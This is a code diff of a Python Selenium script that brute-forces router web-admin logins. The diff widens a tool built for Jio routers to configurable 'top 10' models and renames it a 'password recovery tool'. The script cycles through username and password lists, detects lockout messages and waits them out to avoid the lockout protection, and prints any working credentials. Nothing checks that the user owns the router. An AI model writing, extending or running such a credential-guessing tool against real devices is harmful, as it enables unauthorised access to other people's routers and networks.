@@ -1,10 +1,11 @@
 """
-Jio Router Login Brute-Forcer (Selenium + Auto ChromeDriver)
+Router Password Recovery Tool for Top 10 Routers (Selenium + Auto ChromeDriver)
 Recovers admin password without factory reset.
 """
 
 import os
 import sys
+import json
 from time import sleep
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -19,11 +20,12 @@ from dotenv import load_dotenv
 load_dotenv()
 
 # === CONFIGURATION ===
-ROUTER_URL = os.getenv("ROUTER_URL", "http://192.168.29.1")
+ROUTER_MODEL = os.getenv("ROUTER_MODEL")
+ROUTER_URL = os.getenv("ROUTER_URL")
 USERNAME_FILE = "usernames.txt"
 PASSWORD_FILE = "passwords.txt"
-TIMEOUT_SECONDS = 600  # Lockout duration
-MAX_ATTEMPTS_BEFORE_PAUSE = 5  # Adjust based on router (usually 3–5)
+ROUTERS_FILE = "routers.json"
+MAX_ATTEMPTS_BEFORE_PAUSE = 5  # Global default; overridden by router config if available
 
 # Validate files
 if not os.path.isfile(USERNAME_FILE):
@@ -32,6 +34,23 @@ if not os.path.isfile(USERNAME_FILE):
 if not os.path.isfile(PASSWORD_FILE):
     print(f"Error: {PASSWORD_FILE} not found!")
     sys.exit(1)
+if not os.path.isfile(ROUTERS_FILE):
+    print(f"Error: {ROUTERS_FILE} not found!")
+    sys.exit(1)
+
+# Load router configs
+with open(ROUTERS_FILE, 'r') as f:
+    routers = json.load(f)
+
+if ROUTER_MODEL not in routers:
+    print(f"Error: Router model '{ROUTER_MODEL}' not supported! Check routers.json.")
+    sys.exit(1)
+
+config = routers[ROUTER_MODEL]
+if not ROUTER_URL:
+    ROUTER_URL = config["url"]
+print(f"Using router model: {ROUTER_MODEL}")
+print(f"Target URL: {ROUTER_URL}")
 
 # Load credentials
 def load_list(file_path):
@@ -46,8 +65,7 @@ if not usernames or not passwords:
     sys.exit(1)
 
 print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
-print(f"Target: {ROUTER_URL}")
-print(f"Lockout: {TIMEOUT_SECONDS}s after {MAX_ATTEMPTS_BEFORE_PAUSE} failed attempts\n")
+print(f"Lockout: {config['lockout_timeout']}s after {MAX_ATTEMPTS_BEFORE_PAUSE} failed attempts\n")
 
 # === SETUP SELENIUM ===
 options = webdriver.ChromeOptions()
@@ -67,39 +85,41 @@ def try_login(username, password):
     try:
         driver.get(ROUTER_URL)
         WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.NAME, "users.username"))
+            EC.presence_of_element_located((By.CSS_SELECTOR, config["username_field"]))
         )
 
         # Fill form
-        driver.find_element(By.NAME, "users.username").clear()
-        driver.find_element(By.NAME, "users.username").send_keys(username)
-        driver.find_element(By.NAME, "users.password").clear()
-        driver.find_element(By.NAME, "users.password").send_keys(password)
-        driver.find_element(By.NAME, "button.login.users.dashboard").click()
+        driver.find_element(By.CSS_SELECTOR, config["username_field"]).clear()
+        driver.find_element(By.CSS_SELECTOR, config["username_field"]).send_keys(username)
+        driver.find_element(By.CSS_SELECTOR, config["password_field"]).clear()
+        driver.find_element(By.CSS_SELECTOR, config["password_field"]).send_keys(password)
+        driver.find_element(By.CSS_SELECTOR, config["login_button"]).click()
 
         # === LOCKOUT DETECTION ===
-        try:
-            WebDriverWait(driver, 5).until(
-                EC.presence_of_element_located(
-                    (By.XPATH, "//*[contains(text(), 'Access denied, maximum login attempts reached')]")
+        if config["lockout_message"] != "N/A":
+            try:
+                WebDriverWait(driver, 5).until(
+                    EC.presence_of_element_located(
+                        (By.XPATH, f"//*[contains(text(), '{config['lockout_message']}')]")
+                    )
                 )
-            )
-            print(f"LOCKOUT: {username}/{password} → Waiting {TIMEOUT_SECONDS}s")
-            return "lockout"
-        except TimeoutException:
-            pass
+                print(f"LOCKOUT: {username}/{password} → Waiting {config['lockout_timeout']}s")
+                return "lockout"
+            except TimeoutException:
+                pass
 
         # === FAILURE DETECTION ===
-        try:
-            WebDriverWait(driver, 5).until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, "div.msgError p"))
-            )
-            error = driver.find_element(By.CSS_SELECTOR, "div.msgError p").text
-            if "Invalid username or password" in error:
+        if config["failure_message"] != "N/A":
+            try:
+                WebDriverWait(driver, 5).until(
+                    EC.presence_of_element_located(
+                        (By.XPATH, f"//*[contains(text(), '{config['failure_message']}')]")
+                    )
+                )
                 print(f"Failed: {username}/{password}")
                 return False
-        except TimeoutException:
-            pass
+            except TimeoutException:
+                pass
 
         # === SUCCESS DETECTION ===
         try:
@@ -109,17 +129,21 @@ def try_login(username, password):
         except TimeoutException:
             pass
 
-        try:
-            WebDriverWait(driver, 10).until(
-                EC.presence_of_element_located(
-                    (By.XPATH, "//*[contains(text(), 'Dashboard') or contains(text(), 'Settings') or contains(text(), 'Status') or contains(text(), 'Management')]")
+        # Check for success indicators
+        for indicator in config["success_indicators"]:
+            try:
+                WebDriverWait(driver, 5).until(
+                    EC.presence_of_element_located(
+                        (By.XPATH, f"//*[contains(text(), '{indicator}')]")
+                    )
                 )
-            )
-            print(f"SUCCESS! → Username: {username} | Password: {password} (Dashboard)")
-            return True
-        except TimeoutException:
-            print(f"Ambiguous: {username}/{password} → No clear success/failure")
-            return False
+                print(f"SUCCESS! → Username: {username} | Password: {password} ({indicator})")
+                return True
+            except TimeoutException:
+                continue
+
+        print(f"Ambiguous: {username}/{password} → No clear success/failure")
+        return False
 
     except Exception as e:
         print(f"Error [{username}/{password}]: {str(e)}")
@@ -148,15 +172,15 @@ try:
                 print("Log in now and change the password + backup settings!")
                 break
             elif result == "lockout":
-                print(f"Pausing for {TIMEOUT_SECONDS} seconds...")
-                sleep(TIMEOUT_SECONDS)
+                print(f"Pausing for {config['lockout_timeout']} seconds...")
+                sleep(config['lockout_timeout'])
                 attempt_count -= 1  # Retry same combo
                 continue
             else:
                 # Pause every N attempts
                 if attempt_count % MAX_ATTEMPTS_BEFORE_PAUSE == 0:
-                    print(f"Pause: {TIMEOUT_SECONDS}s to avoid lockout...")
-                    sleep(TIMEOUT_SECONDS)
+                    print(f"Pause: {config['lockout_timeout']}s to avoid lockout...")
+                    sleep(config['lockout_timeout'])
                 else:
                     sleep(2)
 
@@ -168,4 +192,4 @@ finally:
     if not success:
         print("\nNo valid credentials found. Try:")
         print("  • Adding more passwords (mobile, install date, etc.)")
-        print("  • Contact Jio Support: 1800-889-9999")
+        print("  • Contact manufacturer support")
